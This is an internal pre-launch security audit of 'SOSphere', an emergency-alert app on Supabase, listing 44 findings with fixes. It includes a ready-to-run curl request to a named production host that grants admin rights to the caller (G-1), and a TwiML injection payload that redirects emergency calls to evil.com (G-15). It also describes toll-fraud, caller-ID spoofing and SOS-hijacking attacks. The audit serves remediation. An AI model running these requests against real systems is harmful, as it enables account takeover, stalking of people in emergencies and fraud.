# SOSphere — Deep Adversarial Audit Findings
## 2026-04-25 — Pre-launch Final Sweep

> Methodology: 4 parallel specialized agents (reverse-engineer, hacker, programmer, edge-fn deep-dive) + live attack against production Supabase via direct SQL + Supabase Database Advisor. Findings here are NEW — not duplicates of B-01 through B-18 / F-A through F-E (those are fixed and tested).

---

## 🚨 ULTRA-CRITICAL — TOTAL TAKEOVER VECTORS (FIX BEFORE A SINGLE USER LOGS IN)

### G-1 — `promote_user_to_admin(p_user_id)` — anyone with anon key becomes platform admin

**Severity: CRITICAL — game-over**

The RPC has `SECURITY DEFINER`, runs `UPDATE profiles SET role='admin' WHERE id=p_user_id`, and is `GRANTED EXECUTE TO anon, authenticated`. There is no `auth.uid()` check.

**Exploit (one HTTP request, anywhere on the internet):**
```bash
curl -X POST 'https://rtfhkbskgrasamhjraul.supabase.co/rest/v1/rpc/promote_user_to_admin' \
  -H "apikey: $ANON_KEY" -H "Authorization: Bearer $ANON_KEY" \
  -H "Content-Type: application/json" \
  -d '{"p_user_id":"<attacker-own-uuid>"}'
```

**Fix:**
```sql
CREATE OR REPLACE FUNCTION promote_user_to_admin(p_user_id uuid)
RETURNS void LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  -- Only existing admins, super-admins, or service role may promote.
  IF (SELECT role FROM profiles WHERE id = auth.uid()) NOT IN ('admin','super_admin') THEN
    RAISE EXCEPTION 'forbidden';
  END IF;
  UPDATE profiles SET role='admin' WHERE id=p_user_id;
END $$;
REVOKE ALL ON FUNCTION promote_user_to_admin(uuid) FROM PUBLIC, anon, authenticated;
GRANT EXECUTE ON FUNCTION promote_user_to_admin(uuid) TO service_role;
```

---

### G-2 — `emergencies` table policy `USING (true)` — every emergency in the DB exposed

**Severity: CRITICAL — mass live-location leak**

`SELECT * FROM /rest/v1/emergencies` with anon key returns every active emergency's `lat, lon, note, created_at`.

**Fix:** drop the `dashboard_read_all` policy, replace with `is_company_member(emergencies.company_id) OR user_id = auth.uid()`.

---

### G-3 — sos-alert `action=heartbeat | end | escalate` accepts forged emergencyId without auth

**Severity: CRITICAL — hijack any active SOS**

These three actions in `supabase/functions/sos-alert/index.ts` skip the JWT-auth path and update `sos_sessions WHERE id = body.emergencyId` using the service-role client.

**Attack:** any internet caller with the anon key can spoof victim's GPS, kill an active SOS, or fast-escalate one — all without authentication.

**Fix:** call the existing `authenticate(req, supabase)` guard, then verify `sos_sessions.user_id = authUserId` before any write.

---

### G-4 — sos-alert `action=prewarm` accepts client-supplied userId / tier without auth

**Severity: HIGH — phantom session injection**

Anyone can plant `sos_sessions` rows with arbitrary `user_id` + `tier=elite` to pollute the DB or pre-block a real user's emergency window.

**Fix:** require JWT (or short-lived prewarm-token), hard-code `tier='free'` in prewarm, validate `userId` matches JWT.

---

### G-5 — admin-incoming-call.tsx callback button is fake (setTimeout simulation, no Twilio call)

**Severity: CRITICAL — admin believes they called employee, employee's phone never rings**

`src/app/components/admin-incoming-call.tsx:509-518` progresses "Dialing → Connecting → Connected" via hardcoded setTimeouts and starts the LOCAL voice engine but never invokes Twilio outbound.

**Fix:** replace simulation with `supabase.functions.invoke("sos-bridge-twiml", { body: { action: "outbound_call", callId, targetPhone: signal.employeePhone } })`. Only advance UI state after Twilio returns a `callSid`.

---

## 🔴 CRITICAL — HIGH-IMPACT (FIX THIS WEEK)

### G-6 — `get_active_emergency(p_user_id)` — anon stalker tool
GRANTED to anon, authenticated. Returns lat/lon/note for any user. Fix: add `IF auth.uid() != p_user_id THEN RAISE EXCEPTION 'forbidden'; END IF;` and revoke from anon.

### G-7 — `get_user_contacts(p_user_id)` — anon mass PII exfil
Same pattern as G-6. Returns name/phone/relation/priority for any user's emergency contacts. Catastrophic GDPR + COPPA violation if exploited.

### G-8 — `record_twilio_spend(...)` — anon DoS company budgets
Anyone can write to `twilio_spend_ledger` for any company, blowing the budget cap and DoSing real SOS calls. Fix: revoke from anon/authenticated; only edge functions (service role) write here.

### G-9 — `log_sos_audit(...)` — anon audit-trail forgery
Anyone can insert fake audit_log entries. Compliance trail integrity is broken. Fix: revoke from anon/authenticated.

### G-10 — `create_company(text, uuid)` overload — tenant pollution
Two-arg version accepts `p_owner` without checking caller is that user. The one-arg version (correct) uses `auth.uid()`. Drop the two-arg overload entirely.

### G-11 — `check_sos_rate_limit(p_user_id)`, `project_sos_session_to_queue` — anon-callable internals
Probe rate-limit state of any user, or trigger projection logic out of band. Revoke EXECUTE from anon.

### G-12 — twilio-call accepts arbitrary `to:` phone from authenticated user — toll fraud + harassment
`supabase/functions/twilio-call/index.ts:86-92`: any authenticated user supplies `{ to: "+19001234567" }` and Twilio dials whatever number with the SOSphere caller ID, charged to your account.

### G-13 — twilio-sms accepts arbitrary `to:` from authenticated user — smishing
Same pattern. SMS goes to ANY E.164 number with custom body. The `type:"sos"` flag bypasses the rate-limiter. Phishing under your verified Twilio sender ID.

### G-14 — twilio-sms accepts client-supplied `from:` — caller-ID spoofing
Same file: `From` field comes from the request body, passed straight to Twilio. Spoof attempts go through (subject only to Twilio's own ownership check).

### G-15 — twilio-call TwiML injection in `zoneName` / `employeeName` / `companyName`
`twilio-call/index.ts:131-134` interpolates user-controlled strings into TwiML XML without `escapeXml()`. Setting `zoneName = "</Say><Redirect>https://evil.com/twiml</Redirect><Say>"` redirects the live emergency call to attacker-controlled flow. `sos-bridge-twiml` correctly escapes; `twilio-call` was missed.

### G-16 — sos-bridge-twiml `action=accept` unauthenticated, accepts userPhone in URL — toll fraud
`supabase/functions/sos-bridge-twiml/index.ts:175-209`: anyone POSTs `?action=accept&userPhone=+1...` and Twilio places a call to the supplied number on your bill. No JWT, no Twilio signature, no gtok. Fix: require `gtok` HMAC token (already used elsewhere) OR look up `userPhone` from DB by `emergencyId`.

### G-17 — stripe-checkout / stripe-portal open redirect on `successUrl` / `cancelUrl` / `returnUrl`
`supabase/functions/stripe-checkout/index.ts:170-171` + portal: client supplies the URL, Stripe redirects there after payment, leaking the checkout `session_id` in the query string to attacker origin. Fix: allow-list prefix check `successUrl.startsWith(BASE_URL)`.

### G-18 — twilio-token accepts arbitrary `identity` from client — voice impersonation
`supabase/functions/twilio-token/index.ts:169`: client supplies `{ identity }`, function mints a Twilio JWT with that identity. Attacker mints token under victim's identity. Fix: ignore body, derive identity from `userId` (JWT-derived).

### G-19 — `company_message_recipients` + `company_message_rsvps` policy `allow_all (true)` — cross-tenant message leak
Any authenticated user reads all companies' message recipients and RSVPs.

### G-20 — dashboard-actions + delete-account use `Access-Control-Allow-Origin: *` (wildcard CORS)
A malicious origin with stolen JWT (from XSS on any subdomain) can call delete-account and erase the victim's account silently. Other functions correctly use `ALLOWED_ORIGINS`. These two were missed in the B-M1 hardening pass.

### G-21 — dashboard-billing-page Stripe failure → free upgrade to paid in production
`src/app/components/dashboard-billing-page.tsx:237-267`: `catch` block flips local plan state to "active" and toasts "dev mode" string. A transient Stripe outage = free paid plans for whoever clicks Subscribe.

### G-22 — compliance PDF prints MOCK_INCIDENT_TABLE for empty tenants under real company name
`src/app/components/compliance-reports.tsx:499-506` + `compliance-data-service.ts:488-516`: when DB tables are empty, fabricated incident records appear in a PDF labeled with the real company name. Fake document liability.

### G-23 — buddy-system MOCK_PAIRS persisted to localStorage on first run
`src/app/components/buddy-system.tsx:130, 167-189`: first time the screen is opened, fabricated employees are written to `sosphere_employees`, then read by other features (GPS tracker fallback, checkin-timer, compliance roster). Real emergencies could route to "Ahmed Khalil (EMP-001)" instead of the actual new employee.

### G-24 — ai-co-admin unguarded `JSON.parse` on GPS trail crashes the AI panel during emergency
`src/app/components/ai-co-admin.tsx:445`: a corrupted localStorage write (app killed mid-flush) leaves malformed JSON. Next call throws SyntaxError, the entire AI Co-Admin panel error-boundaries during a live SOS.

### G-25 — offline-gps-tracker `beforeunload` listener never fires on Capacitor
`src/app/components/offline-gps-tracker.ts:571`: Android WebView does not dispatch beforeunload. Final GPS positions before app-kill are lost — exactly the most critical ones in a real SOS. Fix: use Capacitor `App.appStateChange` listener.

### G-26 — evidence-vault localStorage TOCTOU — concurrent writes lose vaults
`src/app/components/evidence-vault-service.ts:204-212`: read-modify-write to `localStorage` from multiple simultaneous photo captures clobbers earlier writes. PDF integrity chain reports fewer photos than were actually captured. Fix: serialize via promise lock or move manifest to IndexedDB.

### G-27 — sos-bridge-twiml duplicate conference legs on Twilio retry
`supabase/functions/sos-bridge-twiml/index.ts:175-215`: no idempotency on `action=accept`. Twilio's documented retry behavior dials twice within 2s on flaky cells, billing doubles. Fix: check `sos_sessions.conference_sid` before dialing.

### G-28 — service-worker-register.ts contains the OLD `sosphere-v1` SW as inline fallback
`src/app/components/service-worker-register.ts:199-261`: `generateServiceWorkerCode()` produces the unguarded caching SW that B-14 supposedly replaced. If `/sw.js` 404s on first load, this inline SW takes control and re-introduces the B-14 vulnerability. Fix: delete `generateServiceWorkerCode()` entirely.

---

## 🟡 MEDIUM — DEFENSE-IN-DEPTH

### G-29 — stripe-webhook no `event.id` deduplication
Stripe sends events at-least-once; identical events processed twice if both arrive within network jitter. Fix: dedup table on `event_id`.

### G-30 — verbose 500 stack traces leak schema
`sos-alert`, `twilio-call`, `twilio-sms`, `twilio-token`, `dashboard-actions` return raw Deno error stringifications including DB error messages with table+column names. Fix: generic message in production response, full string only in `console.error`.

### G-31 — 18 tables RLS-enabled-no-policy = dead-or-broken
`evidence_actions`, `evidence_audio`, `evidence_photos`, `geofences`, `mission_gps`, `mission_heartbeats`, `notification_broadcasts`, `outbox_messages`, `process_instances`, `process_steps`, `risk_scores`, `sensor_events`, `sos_dispatch_logs`, `sos_logs`, `sos_public_links`, `sos_requests`, `step_activity`, `system_logs`. Either drop them (dead code) or add proper policies (broken feature).

### G-32 — 30+ functions with mutable `search_path`
Privilege-escalation pre-condition if any extension is added later. Add `SET search_path = public` to every function.

### G-33 — SECURITY DEFINER view `admin_stats` bypasses RLS of querying user
View runs with creator's permissions. Any caller granted SELECT sees data scoped to the view-creator's RLS context, not their own. Convert to a SECURITY INVOKER view or a SECURITY DEFINER function with auth.uid() checks.

### G-34 — Auth: leaked-password protection (HaveIBeenPwned) disabled
Enable in Supabase Auth settings.

### G-35 — audit-log retry queue race (two-tab double-write window)
`audit-log-store.ts:290-328`: two browser tabs flushing simultaneously can drop a newly-enqueued entry. Fix: module-level `flushInFlight` boolean lock.

### G-36 — replay-watcher `visibilitychange` double-register on module reload
`sos-server-trigger.ts:1104`: HMR / Capacitor resume can reset `replayListenerAttached`, registering a second listener. Two simultaneous `replayPendingSOS()` calls.

### G-37 — intelligent-guide useEffect at line 647 has no cleanup
Stale-closure setState on rapid emergency switching marks actions completed that were never executed.

### G-38 — `AES-256 at Rest` badge on pricing page implies SOSphere-managed encryption
Encryption is Supabase-platform, not us. Rephrase: `"At-Rest Encryption (Via Supabase platform, AES-256)"`.

### G-39 — emergency-packet footer `"AES-256 encrypted"` for a plain Supabase URL
The link is plaintext-readable on receipt. Either implement actual end-to-end encryption (URL fragment key) or rephrase: `"Secure link · Expires 24h · GDPR-aligned"`.

### G-40 — checkin-timer sync failure silently `console.warn`'d
`src/app/components/checkin-timer.tsx:39`: missed check-in event is invisible to the safety monitor. Worker's device shows "checked in"; dispatcher dashboard shows "missed". Fix: enqueue to retry queue + visible warning.

### G-41 — Edge functions have NO `AbortSignal.timeout()` on outbound fetch
`sos-alert`, `sos-bridge-twiml`, `stripe-checkout`, `stripe-portal`: a Twilio/Stripe partial network partition hangs Deno workers indefinitely. Fix: `signal: AbortSignal.timeout(8000)` on every external fetch.

---

## 🟢 LOW / INFO

### G-42 — `storage-adapter.ts` client field typed `any`
Loses TypeScript safety for all calls through the adapter.

### G-43 — 95 tables in public schema — massive duplication
`audit_log` AND `audit_logs`, `checkins` AND `checkin_events` AND `employee_checkins` AND `trip_checkins` AND `company_checkin_sessions`, `sos_dispatch_logs` AND `sos_events` AND `sos_logs` AND `sos_messages` AND `sos_outbox` AND `sos_public_links` AND `sos_queue` AND `sos_requests` AND `sos_sessions` AND `sos_timers` etc. Inventory + drop dead tables.

### G-44 — Unusual storage bucket `super_admin_dashboard.html`
Bucket named after an HTML file. Why? Inspect contents. Likely legacy / leftover from a one-off upload.

---

## ✅ CLEAN PATHS (verified, no findings)

These surfaces were attacked from multiple angles and held up:

- **stripe-webhook signature verification** — proper Stripe HMAC-SHA256, constant-time compare, 5-min replay window
- **Twilio gather-token (gtok) handshake on twilio-status** — HMAC-SHA256 with constant-time verify, expiry enforced
- **invite-employees / send-invitations cross-tenant** — B-11 ownership check holds; mixed company_id batches rejected
- **delete-account user identification** — userId derived from JWT only, body ignored
- **dashboard-actions cross-company emergencyId** — B-01 fix holds; callerCompanyId scoped on every read
- **PostgREST `.or()` / `.filter()` injection** — no user-controlled string ever interpolated
- **window.opener / postMessage / innerHTML / dangerouslySetInnerHTML** — none in src/
- **evidence/ storage bucket public flag** — confirmed `public=false`
- **Concurrent SOS double-tap** — atomic UPDATE WHERE NULL pattern serializes correctly
- **voice-call-engine timer / dispose race** — B-03+B-04 fixes hold
- **Service Worker `/sw.js`** — B-14 allow-list correctly never-caches `/functions/`, `/rest/`, `/auth/`, `/realtime/`, Authorization-bearing requests, cross-origin

---

## CONSOLIDATED FIX PLAN — TOMORROW

**Phase 1 (BEFORE ANY USER, est. 2-4 hours):** G-1, G-2, G-3, G-4, G-5
> No civilian, no employee, no admin can sign in until these 5 are closed. Each is a single-request takeover.

**Phase 2 (BEFORE LAUNCH, est. 1 day):** G-6 through G-28
> All HIGH-impact privilege/integrity issues. Each blocks credible enterprise sale.

**Phase 3 (1st week post-launch):** G-29 through G-44
> Defense-in-depth, schema cleanup, copy precision, telemetry hardening.

---

## SUMMARY COUNT

| Severity | Count |
|---|---|
| CRITICAL | 5 |
| HIGH | 23 |
| MEDIUM | 13 |
| LOW / INFO | 3 |
| **TOTAL NEW** | **44** |

Plus 18 BLOCKER fixes (B-01..B-18) + 5 F-defects (F-A..F-E) already closed and tested.

> Generated by 4 parallel agents (reverse-engineer, hacker, programmer, edge-fn deep) + live SQL probes against rtfhkbskgrasamhjraul.supabase.co + Supabase Database Advisor confirmation.
